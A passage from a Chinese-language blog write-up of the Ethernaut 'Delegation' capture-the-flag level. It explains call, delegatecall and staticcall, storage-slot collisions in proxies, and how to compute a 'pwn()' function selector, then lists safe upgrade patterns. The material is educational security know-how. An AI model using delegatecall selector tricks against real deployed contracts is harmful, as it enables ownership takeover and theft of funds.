+<h2 id="📚-核心知识点"><a href="#📚-核心知识点" class="headerlink" title="📚 核心知识点"></a>📚 核心知识点</h2><h3 id="1-EVM-调用类型对比"><a href="#1-EVM-调用类型对比" class="headerlink" title="1. EVM 调用类型对比"></a>1. EVM 调用类型对比</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract CallExample &#123;</span><br><span class="line">    function demonstrateCalls(address target) public &#123;</span><br><span class="line">        // 1. call - 普通外部调用</span><br><span class="line">        (bool success1,) = target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        // 2. delegatecall - 委托调用</span><br><span class="line">        (bool success2,) = target.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        // 3. staticcall - 只读调用</span><br><span class="line">        (bool success3,) = target.staticcall(</span><br><span class="line">            abi.encodeWithSignature(&quot;viewFunction()&quot;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-存储槽冲突示例"><a href="#2-存储槽冲突示例" class="headerlink" title="2. 存储槽冲突示例"></a>2. 存储槽冲突示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// ❌ 危险：不匹配的存储布局</span><br><span class="line">contract ProxyV1 &#123;</span><br><span class="line">    address public owner;    // 槽 0</span><br><span class="line">    uint256 public value;    // 槽 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ImplementationV1 &#123;</span><br><span class="line">    uint256 public data;     // 槽 0 ← 冲突！</span><br><span class="line">    address public admin;    // 槽 1 ← 冲突！</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ✅ 安全：匹配的存储布局</span><br><span class="line">contract ProxyV2 &#123;</span><br><span class="line">    address public owner;    // 槽 0</span><br><span class="line">    uint256 public value;    // 槽 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ImplementationV2 &#123;</span><br><span class="line">    address public owner;    // 槽 0 ← 匹配</span><br><span class="line">    uint256 public value;    // 槽 1 ← 匹配</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-函数选择器计算"><a href="#3-函数选择器计算" class="headerlink" title="3. 函数选择器计算"></a>3. 函数选择器计算</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function calculateSelector() public pure returns (bytes4) &#123;</span><br><span class="line">    // 方法 1：直接计算</span><br><span class="line">    bytes4 selector1 = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    </span><br><span class="line">    // 方法 2：使用 abi.encodeWithSignature</span><br><span class="line">    bytes memory data = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">    bytes4 selector2 = bytes4(data);</span><br><span class="line">    </span><br><span class="line">    // 方法 3：使用 this.functionName.selector</span><br><span class="line">    // bytes4 selector3 = this.pwn.selector; // 如果函数存在</span><br><span class="line">    </span><br><span class="line">    return selector1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🏛️-实际应用场景"><a href="#🏛️-实际应用场景" class="headerlink" title="🏛️ 实际应用场景"></a>🏛️ 实际应用场景</h2><h3 id="代理模式的正确使用"><a href="#代理模式的正确使用" class="headerlink" title="代理模式的正确使用"></a>代理模式的正确使用</h3><ol>
+<li><p><strong>升级模式</strong>：</p>
+<ul>
+<li>UUPS (Universal Upgradeable Proxy Standard)</li>
+<li>Transparent Proxy Pattern</li>
+<li>Beacon Proxy Pattern</li>
+</ul>
+</li>
+<li><p><strong>钻石模式</strong> (EIP-2535)：</p>
+<ul>
+<li>多面切割合约</li>
+<li>功能模块化</li>
+</ul>
+</li>
+<li><p><strong>最小代理</strong> (EIP-1167)：</p>
+<ul>
+<li>Clone Factory Pattern</li>
+<li>节省部署成本</li>
+</ul>
+</li>
+</ol>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p>Delegation 关卡揭示了 <code>delegatecall</code> 的双刃剑特性：</p>
+<ul>
+<li>✅ <strong>理解上下文切换机制</strong> - 代码在不同存储空间执行</li>
+<li>✅ <strong>掌握存储槽布局匹配</strong> - 代理和实现必须一致</li>
+<li>✅ <strong>学习安全代理模式</strong> - 使用标准化解决方案</li>
+<li>✅ <strong>认识函数选择器安全</strong> - 控制可调用的函数</li>
+</ul>
+<p><code>delegatecall</code> 是实现合约升级和模块化的重要工具，但也是许多安全漏洞的根源。理解其工作原理对于构建安全的可升级合约至关重要。</p>
+<hr>
+<h2 id="🔗-相关链接"><a href="#🔗-相关链接" class="headerlink" title="🔗 相关链接"></a>🔗 相关链接</h2><ul>
+<li><strong><a href="/2025/01/25/ethernaut-level-05-token/">上一关: Level 5 - Token</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-07-force/">下一关: Level 7 - Force</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列目录: Ethernaut Foundry Solutions</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy">OpenZeppelin 代理文档</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1967">EIP-1967: Standard Proxy Storage Slots</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions">GitHub 项目</a></strong></li>
+</ul>
+<hr>
+<p><em>在智能合约的世界中，上下文就是一切。</em> 🔄</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/">Ethernaut 系列</a> <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB%E7%AF%87-1-10/">基础攻击篇 (1-10)</a>
+
+      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/delegatecall/" rel="tag">#delegatecall</a> <a class="tag-none-link" href="/tags/%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2/" rel="tag">#上下文切换</a> <a class="tag-none-link" href="/tags/%E5%AD%98%E5%82%A8%E6%A7%BD%E6%94%BB%E5%87%BB/" rel="tag">#存储槽攻击</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
